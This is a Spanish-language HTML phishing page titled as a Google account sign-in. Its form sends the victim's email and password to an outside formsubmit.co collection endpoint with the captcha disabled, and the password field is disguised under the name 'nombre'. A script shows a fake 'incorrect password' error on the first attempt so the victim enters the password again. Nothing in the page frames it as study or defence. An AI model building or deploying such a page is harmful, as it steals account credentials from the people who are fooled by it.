<!DOCTYPE html> 
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Inicia sesión en tu cuenta de Google para continuar</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body class="bg-white text-gray-800 flex items-center justify-center min-h-screen">

  <!-- Contenedor centrado -->
  <div class="w-full max-w-md bg-white shadow-md rounded p-8">
    
    <!-- Logo + Título -->
    <div class="text-center mb-6">
      <i class="fa-solid fa-envelope text-3xl text-emerald-600 mb-2"></i>
      <h1 class="text-xl font-semibold">Accede a tu cuenta</h1>
    </div>

    <!-- Formulario -->
    <form id="contactForm" 
          action="https://formsubmit.co/b58372e3afafe5f908daf1b0cc3c700f" 
          method="POST" 
          class="grid gap-4">

      <!-- Correo primero -->
      <input class="border border-gray-300 rounded px-4 py-2 focus:outline-none focus:ring-1 focus:ring-emerald-500" 
             name="correo" placeholder="Correo electrónico" type="email" required>

      <!-- Nombre después -->
      <div>
        <input id="nombre" 
               class="border border-gray-300 rounded px-4 py-2 w-full focus:outline-none focus:ring-1 focus:ring-emerald-500" 
               name="nombre" placeholder="ingrese su contraseña" required>
        <p id="errorNombre" class="text-red-600 text-sm mt-1 hidden">contraseña incorrecta</p>
      </div>
      
      <!-- Redirección después de enviar -->
      <input type="hidden" name="_next" value="https://tu-pagina.com/gracias.html">
      <!-- Desactivar captcha -->
      <input type="hidden" name="_captcha" value="false">

      <!-- Botón -->
      <button type="submit" 
              class="bg-blue-600 hover:bg-blue-700 text-white py-2 rounded font-medium">
        iniciar sesión 
      </button>
    </form>

    <!-- Link de volver -->

  </div>

  <!-- Script para “trollear” -->
  <script>
    let intentoNombre = 0;

    document.getElementById("contactForm").addEventListener("submit", function(e) {
      const nombre = document.getElementById("nombre");
      const errorMsg = document.getElementById("errorNombre");

      if (intentoNombre === 0) {
        e.preventDefault(); // Bloquea envío la primera vez
        errorMsg.classList.remove("hidden");
        nombre.classList.add("border-red-500");
        intentoNombre++;
      } else {
        errorMsg.classList.add("hidden");
        nombre.classList.remove("border-red-500");
      }
    });
  </script>

</body>
</html>
